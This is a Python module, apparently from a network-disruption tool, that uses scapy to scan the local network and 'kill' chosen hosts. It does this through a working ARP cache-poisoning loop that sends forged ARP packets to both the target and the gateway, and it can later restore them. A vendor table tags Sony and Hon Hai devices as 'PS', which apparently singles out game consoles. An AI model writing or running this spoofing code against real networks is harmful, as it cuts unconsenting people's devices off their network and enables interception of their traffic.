# Set 'scapy' logging level to 'ERROR' to minimize 'WARNING' verbose
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
import os

from .settings import Settings
from ipaddress import IPv4Interface, ip_address
from manuf import MacParser
from scapy.all import ARP, Ether, conf, getmacbyip, send, srp
from subprocess import check_output
from threading import Thread, active_count
from time import perf_counter, sleep

class Network():
    """
    Network class to handle anything network related.
    """
    __get = {'hosts': {}, 'mac': {}}
    __killed = {}
    __mac_parser = MacParser()
    __vendor_tags = {
        'CloudNet': 'PS',
        'HonHaiPr': 'PS',
        'SonyInte': 'PS'
    }

    #: Dictionary data structure
    get = {}

    @classmethod
    def __kill(cls, host):
        """
        Spoof given host by poisoning ARP cache repeatedly.

        This method should run in thread.

        Parameter:
            host -- (dictionary) host fetched from cls.get
        """
        packets = {
            'gateway': ARP(
                psrc = host['ip'],
                pdst = cls.get['gateway']['ip'],
                hwdst = cls.get['gateway']['mac']
            ),
            'host': ARP(
                psrc = cls.get['gateway']['ip'],
                pdst = host['ip'],
                hwdst = host['mac']
            )
        }

        # Poison ARP cache
        while (host['mac'] in cls.__killed):
            if (not Settings.get['SAFE_MODE']):
                send(packets['host'], verbose=False)
                send(packets['gateway'], verbose=False)
                sleep(Settings.get['DELAY'])

    @classmethod
    def cleanup(cls):
        """
        Reset spoofed hosts before termination.
        """
        if (cls.get_killed() == 0):
            return

        print("Resetting spoofed hosts...")
        killed_hosts = list(cls.__killed.keys())
        for mac in killed_hosts:
            t = Thread(target=cls.revive, args=(cls.get['hosts'][mac],))
            t.start()

        # Wait until only main thread remains
        while (active_count() > 1):
            pass

    @classmethod
    def get_gateway(cls):
        """
        Get gateway information.

        Return dictionary.
        """
        gwc = conf.route.route('1.1.1.1')
        cls.get['gateway'] = {
            'ip': gwc[2],
            'mac': getmacbyip(gwc[2])
        }
        return cls.get['gateway']

    @classmethod
    def get_host_by_ip(cls, ip):
        """
        Return dictionary of host.

        Parameter:
            ip -- (string) host IP address
        """
        return cls.get['hosts'][cls.get['mac'][ip]]

    @classmethod
    def get_hosts(cls):
        """
        Get network hosts information via ARP requests.

        Return dictionary with host IP addresses as keys.
        """
        print("Scanning network for hosts...")

        ans = srp(
            Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=f"{cls.get['interface']['ip_cidr']}"),
            timeout = Settings.get['TIMEOUT'],
            verbose = False
        )[0]

        ip_lengths = []
        for h in ans:
            ip = h[1].psrc
            mac = h[1].hwsrc
            ip_lengths.append(len(ip))
            cls.get['mac'][ip] = mac
            cls.get['hosts'][mac] = {
                'ip': ip,
                'mac': mac,
                'vendor': cls.__mac_parser.get_manuf(mac),
                'vendor_long': cls.__mac_parser.get_manuf_long(mac),
                'vendor_tagged': cls.tag_vendor(cls.__mac_parser.get_manuf(mac))
            }
        cls.get['ip_list'] = sorted(ip_address(h[1].psrc) for h in ans)
        cls.get['max_ip_length'] = max(ip_lengths)

        return cls.get['hosts']

    @classmethod
    def get_interface(cls):
        """
        Get network interface information.

        Return dictionary.
        """
        iface = conf.iface
        netmask = cls.get_netmask(iface.ip)
        cls.get['interface'] = {
            'name': iface.name,
            'mac': iface.mac,
            'ip': iface.ip,
            'netmask': netmask,
            'ip_cidr': IPv4Interface(f"{iface.ip}/{netmask}").with_prefixlen
        }
        return cls.get['interface']

    @classmethod
    def get_killed(cls):
        """
        Return amount of killed hosts.
        """
        return len(cls.__killed)

    @classmethod
    def get_netmask(cls, ip):
        """
        Get network interface netmask via 'subprocess'.

        Return netmask string.

        Parameter:
            ip -- (string) target IP address
        """
        if (os.name == 'nt'):
            output = check_output(f'powershell "ipconfig | Select-String -Pattern {ip} -Context 1"', shell=True).decode()
            netmask = output.split(' ')[-1].rstrip()
        else:
            output = check_output(f"ifconfig | grep {ip}", shell=True).decode()
            for i, s in enumerate(output.split(' ')):
                if (s == 'netmask'):
                    break
            n = output.split(' ')[i+1].replace('0x', '')
            netmask = n if '.' in n else '.'.join(str(int(n[i:i+2], 16)) for i in range(0, len(n), 2))
        return netmask

    @classmethod
    def initialize(cls):
        """
        Get interface, gateway, and network hosts information.
        """
        cls.get = dict(cls.__get)
        cls.get_interface()
        cls.get_gateway()
        st = perf_counter()
        cls.get_hosts()

        if (Settings.get['DEBUG']):
            print(f"{'':2}(d) Network.get['interface']")
            print(f"{'':4}{cls.get['interface']}")
            print(f"{'':2}(d) Network.get['gateway']")
            print(f"{'':4}{cls.get['gateway']}")
            print(f"{'':2}(d) Network.get_hosts()")
            print(f"{'':4}{perf_counter()-st:.3f}s")

    @classmethod
    def kill(cls, host):
        """
        Start cls.__kill() in thread if host is alive.

        Parameter:
            host -- (dictionary) host fetched from cls.get
        """
        # Check if host already been killed
        if (host['mac'] in cls.__killed):
            print(f"{'':2}'{host['mac']} - {host['vendor']}' is already killed (~{perf_counter()-cls.__killed[host['mac']]['st']:.3f}s)")
            return

        # Register host in killed list
        cls.__killed[host['mac']] = {
            'st': perf_counter(),
            'thread': Thread(target=cls.__kill, args=(host,))
        }
        cls.__killed[host['mac']]['thread'].start()

        # Artificial delay for consistent UX
        if (not Settings.get['SAFE_MODE']):
            sleep(Settings.get['DELAY'])
        print(f"{'':2}'{host['mac']} - {host['vendor']}' is killed")

    @classmethod
    def revive(cls, host):
        """
        Un-spoof given host by stopping spoof thread and reset ARP packets.

        Parameter:
            host -- (dictionary) host fetched from cls.get
        """
        if (host['mac'] not in cls.__killed):
            print(f"{'':2}(w) '{host['mac']}' is alive!")
            return

        st = cls.__killed[host['mac']]['st']
        t = cls.__killed[host['mac']]['thread']
        del cls.__killed[host['mac']]

        packets = {
            'gateway': ARP(
                psrc = host['ip'],
                hwsrc = host['mac'],
                pdst = cls.get['gateway']['ip'],
                hwdst = cls.get['gateway']['mac']
            ),
            'host': ARP(
                psrc = cls.get['gateway']['ip'],
                hwsrc = cls.get['gateway']['mac'],
                pdst = host['ip'],
                hwdst = host['mac']
            )
        }

        # Wait for target thread to terminate
        t.join()

        # Reset packets to host and gateway
        if (not Settings.get['SAFE_MODE']):
            send(packets['host'], verbose=False)
            send(packets['gateway'], verbose=False)

        print(f"{'':2}'{host['mac']} - {host['vendor']}' is revived ({perf_counter()-st:.3f}s)")

    @classmethod
    def spoof(cls, host):
        """
        Spoof and un-spoof host with 'WAIT_DURATION' in Settings.

        Parameter:
            host -- (dictionary) host fetched from cls.get
        """
        cls.kill(host)
        sleep(Settings.get['WAIT_DURATION'])
        cls.revive(host)

    @classmethod
    def tag_vendor(cls, vendor):
        """
        Tag matched vendor.

        Return extended name.

        Parameter:
            vendor -- (string) manufacturer
        """
        tagged = vendor
        if (vendor in cls.__vendor_tags):
            tagged = f"{vendor} ({cls.__vendor_tags[vendor]})"
        return tagged